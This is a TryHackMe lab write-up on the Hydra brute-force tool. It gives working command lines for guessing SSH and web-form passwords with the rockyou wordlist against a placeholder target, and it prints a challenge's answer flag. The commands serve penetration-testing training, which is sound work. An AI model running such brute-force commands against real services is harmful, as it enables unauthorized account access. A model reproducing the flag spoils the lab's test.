# 🐍 Hydra

Hydra is one of the most popular online password-cracking tools used during penetration testing. It automates brute-force attacks against login services such as SSH, FTP, web applications, databases, and many other network protocols.

From a cybersecurity perspective, Hydra helps security professionals assess the strength of authentication mechanisms and identify weak credentials before attackers do.

## 🧭 Task 1: Hydra Introduction

### 🐍 What is Hydra?

Hydra is a fast and flexible online password-cracking tool designed to automate login attempts against various network services.

Instead of manually trying usernames and passwords, Hydra can rapidly test thousands or even millions of password combinations using a wordlist.

#### Example Scenario

Imagine attempting to guess a user's SSH password manually:

```text
admin : password
admin : admin123
admin : qwerty
admin : letmein
```

This would take a very long time.

Hydra automates this process by testing credentials at high speed.

### 🌐 Supported Protocols

Hydra supports a huge range of services, including:

* SSH
* FTP
* HTTP
* HTTPS
* SMB
* SMTP
* POP3
* IMAP
* MySQL
* PostgreSQL
* MSSQL
* LDAP
* SNMP
* RDP
* Telnet
* VNC
* MongoDB

And many more.

### 🔐 Why Strong Passwords Matter

Hydra demonstrates why weak passwords are dangerous.

Examples of poor passwords:

```text
password
admin
123456
qwerty
letmein
```

These often appear in common password lists such as:

```text
rockyou.txt
```

Default credentials are especially risky:

```text
admin:admin
admin:password
root:root
```

Always change default credentials and use strong passwords with:

* Uppercase letters
* Lowercase letters
* Numbers
* Special characters
* Sufficient length

## 🧭 Task 2: Using Hydra

Hydra is pre-installed on the TryHackMe AttackBox and many penetration testing distributions.

### ⚙️ Basic Hydra Syntax

General structure:

```bash
hydra [options] target service
```

Example:

```bash
hydra -l user -P passlist.txt ftp://MACHINE_IP
```

This tells Hydra:

* Username = user
* Password list = passlist.txt
* Target service = FTP

### 🔐 SSH Brute Force

One of the most common Hydra use cases is testing SSH credentials.

#### Command Structure

```bash
hydra -l <username> -P <passwordlist> MACHINE_IP -t 4 ssh
```

### Important Options

| Option | Description       |
| ------ | ----------------- |
| `-l`   | Username          |
| `-P`   | Password list     |
| `-t`   | Number of threads |
| `ssh`  | Target service    |

#### Example

```bash
hydra -l root -P passwords.txt MACHINE_IP -t 4 ssh
```

This command:

1. Uses username `root`
2. Loads passwords from `passwords.txt`
3. Runs 4 concurrent threads
4. Attacks the SSH service

### 🌐 Brute Forcing Web Login Forms

Hydra can also attack web authentication forms.

To do this, we must identify:

* Login URL
* Form fields
* Failure message
* Request method (GET or POST)

### POST Form Syntax

```bash
hydra -l <username> -P <wordlist> MACHINE_IP http-post-form "<path>:<credentials>:<failure_message>"
```

### Parameters Explained

| Option              | Description                |
| ------------------- | -------------------------- |
| `-l`                | Username                   |
| `-P`                | Password list              |
| `http-post-form`    | POST login attack          |
| `<path>`            | Login page path            |
| `<credentials>`     | Form parameters            |
| `<failure_message>` | Text shown on failed login |
| `-V`                | Verbose output             |

#### Example

```bash
hydra -l admin -P passwords.txt MACHINE_IP http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V
```

Hydra will:

1. Open `/login`
2. Insert username into `^USER^`
3. Insert passwords into `^PASS^`
4. Detect failures when "incorrect" appears

### Non-Standard Ports

If the application uses another port:

```bash
hydra -l admin -P passwords.txt MACHINE_IP http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -s 8080 -V
```

### 🧭 Practical Challenge 1: Molly's Web Password

The objective was to brute-force Molly's web account.

#### Command Used

```bash
hydra -l molly -P /usr/share/wordlists/rockyou.txt MACHINE_IP http-post-form "/login:username=^USER^&password=^PASS^:F=Your username or password is incorrect" -V -t 4
```

### Command Breakdown

#### Tool

```bash
hydra
```

Launches Hydra.

#### Username

```bash
-l molly
```

Uses:

```text
molly
```

as the login username.

#### Password List

```bash
-P /usr/share/wordlists/rockyou.txt
```

Uses the famous RockYou password list.

#### Target

```bash
MACHINE_IP
```

Target server.

#### Attack Type

```bash
http-post-form
```

Indicates a POST-based login form.

#### Form Specification

```bash
"/login:username=^USER^&password=^PASS^:F=Your username or password is incorrect"
```

#### Login Endpoint

```text
/login
```

#### Username Field

```text
username=^USER^
```

Hydra replaces:

```text
^USER^
```

with:

```text
molly
```

#### Password Field

```text
password=^PASS^
```

Hydra replaces:

```text
^PASS^
```

with every password from the wordlist.

#### Failure String

```text
F=Your username or password is incorrect
```

If this text appears, Hydra knows the login attempt failed.

#### Verbose Output

```bash
-V
```

Displays every attempt.

#### Threads

```bash
-t 4
```

Runs four simultaneous login attempts.

### ✅ Answer

**Use Hydra to brute-force Molly's web password. What is Flag 1?**

```text
THM{2673a7dd116de68e85c48ec0b1f2612e}
```
